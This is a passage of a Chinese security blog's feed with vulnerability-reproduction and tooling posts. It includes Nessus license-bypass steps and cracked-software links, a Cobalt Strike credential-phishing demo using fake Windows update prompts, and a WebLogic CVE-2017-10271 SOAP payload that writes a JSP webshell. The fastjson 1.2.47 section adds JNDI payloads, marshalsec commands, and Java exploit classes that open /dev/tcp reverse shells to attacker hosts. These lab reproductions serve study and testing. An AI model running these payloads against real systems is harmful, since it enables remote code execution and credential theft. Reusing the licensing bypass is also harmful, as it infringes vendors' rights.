alt="image-20201031224452826"></p><p>拷贝一份/opt/nessus/lib/nessus/plugins的内容</p><p>修改/opt/nessus/lib/nessus/plugins/和/opt/nessus/var/nessus/目录下plugin_feed_info.inc，日期修改为之前记录的日期</p><p><img src="//choge.top/2020/10/28/主流漏洞扫描器使用/image-20201101121120403.png" alt="image-20201101121120403"></p><p>重启后发现插件不见了，此时将plugin_feed_info.inc拷贝到/opt/nessus/lib/nessus/plugins/和/opt/nessus/var/nessus/目录下，重启nessus，发现已无限制</p><p><img src="//choge.top/2020/10/28/主流漏洞扫描器使用/image-20201101121844425.png" alt="image-20201101121844425"></p><p>再将之前拷贝的插件文件放到/opt/nessus/lib/nessus/plugins/下</p><p><img src="//choge.top/2020/10/28/主流漏洞扫描器使用/image-20201101133957447.png" alt="image-20201101133957447"></p><p>重启后可正常扫描，扫描如下</p><p><img src="//choge.top/2020/10/28/主流漏洞扫描器使用/image-20201101154513940.png" alt="image-20201101154513940"></p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>Nessus对主机漏洞的发现最全面，AWVS发现Web应用漏洞较好，相比于Appscan和Burpsuite速度会快很多，Appscan相比于AWVS发现Web应用漏洞更全面，但会慢很多，运行Appscan的Windows也会比较卡。实际渗透过程中Burpsuite的爬虫配合Xray进行扫描会有一个比较好的效果，goby更适合突破边界后对内网的探测。</p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p>appscan破解版</p><p><a href="https://mrxn.net/662.html" target="_blank" rel="noopener">https://mrxn.net/662.html</a></p><p>Nessus扫描器使用</p><p><a href="https://mp.weixin.qq.com/s/GB6pf7Fb2y0HinJPkswZag" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/GB6pf7Fb2y0HinJPkswZag</a></p><p>Nessus扫描器破解</p><p><a href="https://mp.weixin.qq.com/s/9OCqVPfueKPczxY0xHhFKA" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/9OCqVPfueKPczxY0xHhFKA</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;本文主要总结下各类主流扫描器使用，包含Nessus，AWVS，Appscan，Burpsuite，Xray，Goby等&lt;/p&gt;&lt;p&gt;本文测试网站为&lt;a href=&quot;http://testphp.vulnweb.com/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://testphp.vulnweb.com/&lt;/a&gt;&lt;/p&gt;&lt;h3 id=&quot;AWVS&quot;&gt;&lt;a href=&quot;#AWVS&quot; class=&quot;headerlink&quot; title=&quot;AWVS&quot;&gt;&lt;/a&gt;AWVS&lt;/h3&gt;&lt;p&gt;AWVS使用docker镜像安装如下&lt;/p&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#  pull 拉取下载镜像&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;docker pull secfa/docker-awvs&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#  将Docker的3443端口映射到物理机的 13443端口&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;docker run -it -d -p 13443:3443 secfa/docker-awvs&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# 容器的相关信息&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;awvs13 username: admin@admin.com&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;awvs13 password: Admin123&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;AWVS版本：13.0.200217097&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
    
      <category term="Penetration test" scheme="https://choge.top/categories/Penetration-test/"/>
    
    
      <category term="tool" scheme="https://choge.top/tags/tool/"/>
    
  </entry>
  
  <entry>
    <title>Cobaltstrike之项目收集与CredentialPhisher钓鱼项目演示和.net加载</title>
    <link href="https://choge.top/2020/10/26/Cobaltstrike%E4%B9%8B%E9%A1%B9%E7%9B%AE%E6%94%B6%E9%9B%86%E4%B8%8ECredentialPhisher%E9%92%93%E9%B1%BC%E9%A1%B9%E7%9B%AE%E6%BC%94%E7%A4%BA%E5%92%8C-net%E5%8A%A0%E8%BD%BD/"/>
    <id>https://choge.top/2020/10/26/Cobaltstrike之项目收集与CredentialPhisher钓鱼项目演示和-net加载/</id>
    <published>2020-10-26T03:22:32.645Z</published>
    <updated>2020-10-26T03:23:42.043Z</updated>
    
    <content type="html"><![CDATA[<h3 id="Cobaltstrike项目收集"><a href="#Cobaltstrike项目收集" class="headerlink" title="Cobaltstrike项目收集"></a>Cobaltstrike项目收集</h3><p><a href="https://mp.weixin.qq.com/s/CEI1XYkq2PZmYsP0DRU7jg" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/CEI1XYkq2PZmYsP0DRU7jg</a></p><h3 id="Invoke-CredentialPhisher钓鱼"><a href="#Invoke-CredentialPhisher钓鱼" class="headerlink" title="Invoke-CredentialPhisher钓鱼"></a>Invoke-CredentialPhisher钓鱼</h3><p>Invoke-CredentialPhisher是一个比较骚的项目，作者通过PSH实现了Windows几种场景下的钓鱼弹窗，诱导目标输出账号密码之后会带回teamserver，win7测试有点问题，但是win10效果比较好，窗口效果很逼真。作者博客有一篇文章专门介绍撰写思路，可以参考。</p><a id="more"></a><p>地址：</p><p><a href="https://github.com/fox-it/Invoke-CredentialPhisher.git" target="_blank" rel="noopener">https://github.com/fox-it/Invoke-CredentialPhisher.git</a></p><p>文章参考地址：</p><p><a href="https://blog.fox-it.com/2018/08/14/phishing-ask-and-ye-shall-receive/" target="_blank" rel="noopener">https://blog.fox-it.com/2018/08/14/phishing-ask-and-ye-shall-receive/</a></p><h4 id="演示"><a href="#演示" class="headerlink" title="演示"></a>演示</h4><p>导入项目，使用windows更新进行钓鱼</p><p><img src="//choge.top/2020/10/26/Cobaltstrike之项目收集与CredentialPhisher钓鱼项目演示和-net加载/image-20200901193122123.png" alt="image-20200901193122123"></p><p>进行配置如下</p><p><img src="//choge.top/2020/10/26/Cobaltstrike之项目收集与CredentialPhisher钓鱼项目演示和-net加载/image-20200901193147384.png" alt="image-20200901193147384"></p><p>Windows主机弹出更新</p><p><img src="//choge.top/2020/10/26/Cobaltstrike之项目收集与CredentialPhisher钓鱼项目演示和-net加载/image-20200901193220094.png" alt="image-20200901193220094"></p><p>用户输入数据</p><p><img src="//choge.top/2020/10/26/Cobaltstrike之项目收集与CredentialPhisher钓鱼项目演示和-net加载/image-20200901193253594.png" alt="image-20200901193253594"></p><p>cs返回结果</p><p><img src="//choge.top/2020/10/26/Cobaltstrike之项目收集与CredentialPhisher钓鱼项目演示和-net加载/image-20200901193333921.png" alt="image-20200901193333921"></p><h3 id="net加载"><a href="#net加载" class="headerlink" title=".net加载"></a>.net加载</h3><p>.net加载使用命令如下</p><p><img src="//choge.top/2020/10/26/Cobaltstrike之项目收集与CredentialPhisher钓鱼项目演示和-net加载/image-20200901163215946.png" alt="image-20200901163215946"></p><p><img src="//choge.top/2020/10/26/Cobaltstrike之项目收集与CredentialPhisher钓鱼项目演示和-net加载/image-20200901163308907.png" alt="image-20200901163308907"></p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;Cobaltstrike项目收集&quot;&gt;&lt;a href=&quot;#Cobaltstrike项目收集&quot; class=&quot;headerlink&quot; title=&quot;Cobaltstrike项目收集&quot;&gt;&lt;/a&gt;Cobaltstrike项目收集&lt;/h3&gt;&lt;p&gt;&lt;a href=&quot;https://mp.weixin.qq.com/s/CEI1XYkq2PZmYsP0DRU7jg&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://mp.weixin.qq.com/s/CEI1XYkq2PZmYsP0DRU7jg&lt;/a&gt;&lt;/p&gt;&lt;h3 id=&quot;Invoke-CredentialPhisher钓鱼&quot;&gt;&lt;a href=&quot;#Invoke-CredentialPhisher钓鱼&quot; class=&quot;headerlink&quot; title=&quot;Invoke-CredentialPhisher钓鱼&quot;&gt;&lt;/a&gt;Invoke-CredentialPhisher钓鱼&lt;/h3&gt;&lt;p&gt;Invoke-CredentialPhisher是一个比较骚的项目，作者通过PSH实现了Windows几种场景下的钓鱼弹窗，诱导目标输出账号密码之后会带回teamserver，win7测试有点问题，但是win10效果比较好，窗口效果很逼真。作者博客有一篇文章专门介绍撰写思路，可以参考。&lt;/p&gt;
    
    </summary>
    
    
      <category term="Cobalt Strike" scheme="https://choge.top/categories/Cobalt-Strike/"/>
    
    
      <category term="cs" scheme="https://choge.top/tags/cs/"/>
    
  </entry>
  
  <entry>
    <title>Weblogic漏洞复现</title>
    <link href="https://choge.top/2020/10/15/Weblogic%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    <id>https://choge.top/2020/10/15/Weblogic漏洞复现/</id>
    <published>2020-10-15T10:39:57.000Z</published>
    <updated>2020-10-28T02:35:58.139Z</updated>
    
    <content type="html"><![CDATA[<p>复现Weblogic经典CVE-2017-10271和CVE-2018-2628漏洞</p><h2 id="CVE-2017-10271"><a href="#CVE-2017-10271" class="headerlink" title="CVE-2017-10271"></a>CVE-2017-10271</h2><p>启动Weblogic环境</p><p><img src="//choge.top/2020/10/15/Weblogic漏洞复现/image-20201015212210729.png" alt="image-20201015212210729"></p><p>进入如下路径进行查看，如果展示如下信息基本上存在漏洞</p><p><img src="//choge.top/2020/10/15/Weblogic漏洞复现/image-20201015212331129.png" alt="image-20201015212331129"></p><p>执行反弹shell命令，注意Content-Type要改成text/xml</p><p><img src="//choge.top/2020/10/15/Weblogic漏洞复现/image-20201015212805855.png" alt="image-20201015212805855"></p><p>vps<code>nc -lvvp 5555</code>后成功反弹shell</p><a id="more"></a><p><img src="//choge.top/2020/10/15/Weblogic漏洞复现/image-20201015212830685.png" alt="image-20201015212830685"></p><p>写入一句话木马</p><figure class="highlight mojolicious"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">soapenv:Envelope</span> <span class="attr">xmlns:soapenv</span>=<span class="string">"http://schemas.xmlsoap.org/soap/envelope/"</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">soapenv:Header</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">work:WorkContext</span> <span class="attr">xmlns:work</span>=<span class="string">"http://bea.com/2004/06/soap/workarea/"</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">java</span>&gt;</span><span class="tag">&lt;<span class="name">java</span> <span class="attr">version</span>=<span class="string">"1.4.0"</span> <span class="attr">class</span>=<span class="string">"java.beans.XMLDecoder"</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">object</span> <span class="attr">class</span>=<span class="string">"java.io.PrintWriter"</span>&gt;</span> </span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">string</span>&gt;</span>servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/test.jsp<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">void</span> <span class="attr">method</span>=<span class="string">"println"</span>&gt;</span><span class="tag">&lt;<span class="name">string</span>&gt;</span></span></span><br><span class="line"><span class="xml">    &lt;![CDATA[</span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">%</span></span></span><span class="perl"> out.<span class="keyword">print</span>(<span class="string">"test"</span>); </span><span class="xml"><span class="tag">%&gt;</span></span></span><br><span class="line"><span class="xml">    ]]&gt;</span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">string</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">void</span> <span class="attr">method</span>=<span class="string">"close"</span>/&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">object</span>&gt;</span><span class="tag">&lt;/<span class="name">java</span>&gt;</span><span class="tag">&lt;/<span class="name">java</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">work:WorkContext</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">soapenv:Header</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">soapenv:Body</span>/&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">soapenv:Envelope</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p><img src="//choge.top/2020/10/15/Weblogic漏洞复现/image-20201015215109951.png" alt="image-20201015215109951"></p><p>一句话访问成功</p><p><a href="http://192.168.31.109:7001/bea_wls_internal/test.jsp" target="_blank" rel="noopener">http://192.168.31.109:7001/bea_wls_internal/test.jsp</a></p><p><img src="//choge.top/2020/10/15/Weblogic漏洞复现/image-20201015215205202.png" alt="image-20201015215205202"></p><h2 id="CVE-2018-2628"><a href="#CVE-2018-2628" class="headerlink" title="CVE-2018-2628"></a>CVE-2018-2628</h2><p>Python攻击脚本下载地址</p><p><a href="https://www.exploit-db.com/exploits/44553" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/44553</a></p><p>将Bash命令进行编码</p><p><img src="//choge.top/2020/10/15/Weblogic漏洞复现/image-20201027191914399.png" alt="image-20201027191914399"></p><p>vps执行以下命令</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">java</span> <span class="selector-tag">-cp</span> <span class="selector-tag">ysoserial-0</span><span class="selector-class">.0</span><span class="selector-class">.6-SNAPSHOT-BETA-all</span><span class="selector-class">.jar</span> <span class="selector-tag">ysoserial</span><span class="selector-class">.exploit</span><span class="selector-class">.JRMPListener</span> <span class="selector-attr">[listen port]</span> <span class="selector-tag">CommonsCollections1</span> <span class="selector-attr">[command]</span></span><br><span class="line">## <span class="selector-attr">[listen port]</span> 监听端口</span><br><span class="line">## <span class="selector-attr">[command]</span> 需要执行的命令</span><br></pre></td></tr></table></figure><p><img src="//choge.top/2020/10/15/Weblogic漏洞复现/image-20201027191958247.png" alt="image-20201027191958247"></p><p>攻击机执行以下命令</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">python</span> 44553<span class="selector-class">.py</span> <span class="selector-attr">[目标ip]</span> <span class="selector-attr">[目标端口]</span> <span class="selector-attr">[本地ysoserial路径]</span> <span class="selector-attr">[vpsip]</span> <span class="selector-attr">[JRMP监听端口]</span> <span class="selector-attr">[JRMPclient]</span></span><br></pre></td></tr></table></figure><p><img src="//choge.top/2020/10/15/Weblogic漏洞复现/image-20201027192057654.png" alt="image-20201027192057654"></p><p>成功反弹shell</p><p><img src="//choge.top/2020/10/15/Weblogic漏洞复现/image-20201027191827641.png" alt="image-20201027191827641"></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;复现Weblogic经典CVE-2017-10271和CVE-2018-2628漏洞&lt;/p&gt;&lt;h2 id=&quot;CVE-2017-10271&quot;&gt;&lt;a href=&quot;#CVE-2017-10271&quot; class=&quot;headerlink&quot; title=&quot;CVE-2017-10271&quot;&gt;&lt;/a&gt;CVE-2017-10271&lt;/h2&gt;&lt;p&gt;启动Weblogic环境&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;//choge.top/2020/10/15/Weblogic漏洞复现/image-20201015212210729.png&quot; alt=&quot;image-20201015212210729&quot;&gt;&lt;/p&gt;&lt;p&gt;进入如下路径进行查看，如果展示如下信息基本上存在漏洞&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;//choge.top/2020/10/15/Weblogic漏洞复现/image-20201015212331129.png&quot; alt=&quot;image-20201015212331129&quot;&gt;&lt;/p&gt;&lt;p&gt;执行反弹shell命令，注意Content-Type要改成text/xml&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;//choge.top/2020/10/15/Weblogic漏洞复现/image-20201015212805855.png&quot; alt=&quot;image-20201015212805855&quot;&gt;&lt;/p&gt;&lt;p&gt;vps&lt;code&gt;nc -lvvp 5555&lt;/code&gt;后成功反弹shell&lt;/p&gt;
    
    </summary>
    
    
      <category term="漏洞复现" scheme="https://choge.top/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
      <category term="weblogic" scheme="https://choge.top/tags/weblogic/"/>
    
  </entry>
  
  <entry>
    <title>fastjson反序列化漏洞复现</title>
    <link href="https://choge.top/2020/10/12/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    <id>https://choge.top/2020/10/12/fastjson反序列化漏洞复现/</id>
    <published>2020-10-12T08:23:02.000Z</published>
    <updated>2020-10-27T03:27:51.568Z</updated>
    
    <content type="html"><![CDATA[<p>本文主要复现Fastjson 1.2.47 远程命令执行漏洞</p><h3 id="判断是否使用fastjson"><a href="#判断是否使用fastjson" class="headerlink" title="判断是否使用fastjson"></a>判断是否使用fastjson</h3><p>启动环境，可以根据logo图标判断是否使用了fastjson</p><p><img src="//choge.top/2020/10/12/fastjson反序列化漏洞复现/image-20201013165844484.png" alt="image-20201013165844484"></p><p>转换为post方式提交，查看放回包也可以判断是否使用了fastjson</p><p><img src="//choge.top/2020/10/12/fastjson反序列化漏洞复现/image-20201015140321953.png" alt="image-20201015140321953"></p><p>DNSLog判断</p><p>判断payload</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">"@type"</span>:<span class="string">"java.net.Inet4Address"</span>, <span class="string">"val"</span>:<span class="string">"dnslog"</span>&#125;</span><br><span class="line">&#123;<span class="string">"@type"</span>:<span class="string">"java.net.Inet6Address"</span>, <span class="string">"val"</span>:<span class="string">"dnslog"</span>&#125;</span><br><span class="line">&#123;<span class="string">"@type"</span>:<span class="string">"java.net.InetSocketAddress"</span>&#123;<span class="string">"address"</span>:, <span class="string">"val"</span>:<span class="string">"dnslog"</span>&#125;&#125;</span><br><span class="line">&#123;<span class="string">"@type"</span>:<span class="string">"com.alibaba.fastjson.JSONObject"</span>, &#123;<span class="string">"@type"</span>: <span class="string">"java.net.URL"</span>, <span class="string">"val"</span>:<span class="string">"dnslog"</span>&#125;&#125;<span class="string">""</span>&#125;</span><br><span class="line">&#123;&#123;<span class="string">"@type"</span>:<span class="string">"java.net.URL"</span>, <span class="string">"val"</span>:<span class="string">"dnslog"</span>&#125;:<span class="string">"aaa"</span>&#125;</span><br><span class="line">Set[&#123;<span class="string">"@type"</span>:<span class="string">"java.net.URL"</span>, <span class="string">"val"</span>:<span class="string">"dnslog"</span>&#125;]</span><br><span class="line">Set[&#123;<span class="string">"@type"</span>:<span class="string">"java.net.URL"</span>, <span class="string">"val"</span>:<span class="string">"dnslog"</span>&#125;</span><br><span class="line">&#123;&#123;<span class="string">"@type"</span>:<span class="string">"java.net.URL"</span>, <span class="string">"val"</span>:<span class="string">"dnslog"</span>&#125;:<span class="number">0</span></span><br></pre></td></tr></table></figure><a id="more"></a><p>以上payload填入以下代码{“a”:}中的:后面</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"a"</span>:&#123;</span><br><span class="line">        <span class="attr">"@type"</span>:<span class="string">"java.lang.Class"</span>,</span><br><span class="line">        <span class="attr">"val"</span>:<span class="string">"com.sun.rowset.JdbcRowSetImpl"</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">"b"</span>:&#123;</span><br><span class="line">        <span class="attr">"@type"</span>:<span class="string">"com.sun.rowset.JdbcRowSetImpl"</span>,</span><br><span class="line">        <span class="attr">"dataSourceName"</span>:<span class="string">"ldap://6v0jfv.dnslog.cn"</span>,</span><br><span class="line">        <span class="attr">"autoCommit"</span>:<span class="literal">true</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>DNSLog有回显，存在fastjson</p><p><img src="//choge.top/2020/10/12/fastjson反序列化漏洞复现/image-20201015134453665.png" alt="image-20201015134453665"></p><h3 id="RMI模式getshell"><a href="#RMI模式getshell" class="headerlink" title="RMI模式getshell"></a>RMI模式getshell</h3><p>exp项目地址：<a href="https://github.com/CaijiOrz/fastjson-1.2.47-RCE" target="_blank" rel="noopener">https://github.com/CaijiOrz/fastjson-1.2.47-RCE</a></p><p>代码如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Exploit</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Exploit</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">"/bin/bash -c $@|bash 0 echo bash -i &gt;&amp;/dev/tcp/127.0.0.1/8888 0&gt;&amp;1"</span>);</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] argv)</span></span>&#123;</span><br><span class="line">        Exploit e = <span class="keyword">new</span> Exploit();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>VPS中下载此项目，将其中ip和监听端口修改为vps的ip和需要监听的端口，同时使用nc监听1234端口，<code>nc -lvvp 1234</code></p><p><img src="//choge.top/2020/10/12/fastjson反序列化漏洞复现/image-20201014193236513.png" alt="image-20201014193236513"></p><p><code>javac Exploit.java</code>编译出Exploit.class文件</p><p><img src="//choge.top/2020/10/12/fastjson反序列化漏洞复现/image-20201013215823894.png" alt="image-20201013215823894"></p><p>vps启动一个web服务，要求能访问到Exploit.class</p><p><img src="//choge.top/2020/10/12/fastjson反序列化漏洞复现/image-20201013220111504.png" alt="image-20201013220111504"></p><p>VPS启一个rmi监听9999端口</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp marshalsec-<span class="number">0.0</span>.<span class="number">3</span>-SNAPSHOT-all<span class="selector-class">.jar</span> marshalsec<span class="selector-class">.jndi</span><span class="selector-class">.RMIRefServer</span> <span class="string">"http://vpsip:8082/#Exploit"</span> <span class="number">9999</span></span><br></pre></td></tr></table></figure><p><img src="//choge.top/2020/10/12/fastjson反序列化漏洞复现/image-20201015141543905.png" alt="image-20201015141543905"></p><p>Burpsuite将请求转换为post模式，执行以下payload，注意如果无法解析json需要在请求头中加入<code>COntent-Type: application/json</code></p><p><img src="//choge.top/2020/10/12/fastjson反序列化漏洞复现/image-20201015141512313.png" alt="image-20201015141512313"></p><p>vps反弹shell，执行命令成功</p><p><img src="//choge.top/2020/10/12/fastjson反序列化漏洞复现/image-20201015141635598.png" alt="image-20201015141635598"></p><h3 id="ldap模式getshell"><a href="#ldap模式getshell" class="headerlink" title="ldap模式getshell"></a>ldap模式getshell</h3><p>vps执行如下代码</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp marshalsec-<span class="number">0.0</span>.<span class="number">3</span>-SNAPSHOT-all<span class="selector-class">.jar</span> marshalsec<span class="selector-class">.jndi</span><span class="selector-class">.LDAPRefServer</span> <span class="string">"http://vpsip:8082/#Exploit"</span> <span class="number">9999</span></span><br></pre></td></tr></table></figure><p><img src="//choge.top/2020/10/12/fastjson反序列化漏洞复现/image-20201015183410772.png" alt="image-20201015183410772"></p><p>Burpsuite执行如下payload</p><p><img src="//choge.top/2020/10/12/fastjson反序列化漏洞复现/image-20201015183508190.png" alt="image-20201015183508190"></p><p>成功反弹shell</p><p><img src="//choge.top/2020/10/12/fastjson反序列化漏洞复现/image-20201015183614612.png" alt="image-20201015183614612"></p><p>修复参考如下</p><p><img src="//choge.top/2020/10/12/fastjson反序列化漏洞复现/image-20201015134754660.png" alt="image-20201015134754660"></p><p>其他java利用代码如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStreamReader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Exploit</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Exploit</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Process p = Runtime.getRuntime().exec(<span class="keyword">new</span> String[]&#123;<span class="string">"/bin/bash"</span>,<span class="string">"-c"</span>,<span class="string">"exec 5&lt;&gt;/dev/tcp/192.168.142.44/5555;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done"</span>&#125;);</span><br><span class="line">        InputStream is = p.getInputStream();</span><br><span class="line">        BufferedReader reader = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(is));</span><br><span class="line"></span><br><span class="line">        String line;</span><br><span class="line">        <span class="keyword">while</span>((line = reader.readLine()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">            System.out.println(line);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        p.waitFor();</span><br><span class="line">        is.close();</span><br><span class="line">        reader.close();</span><br><span class="line">        p.destroy();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://www.cnblogs.com/hei-zi/p/13274272.html" target="_blank" rel="noopener">https://www.cnblogs.com/hei-zi/p/13274272.html</a></p><p>fastjson绕过</p><p><a href="https://mp.weixin.qq.com/s/pL338gF1pfF2c8WA5rTEcw" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/pL338gF1pfF2c8WA5rTEcw</a></p>]]></content>
    
    <summary type="html">
    
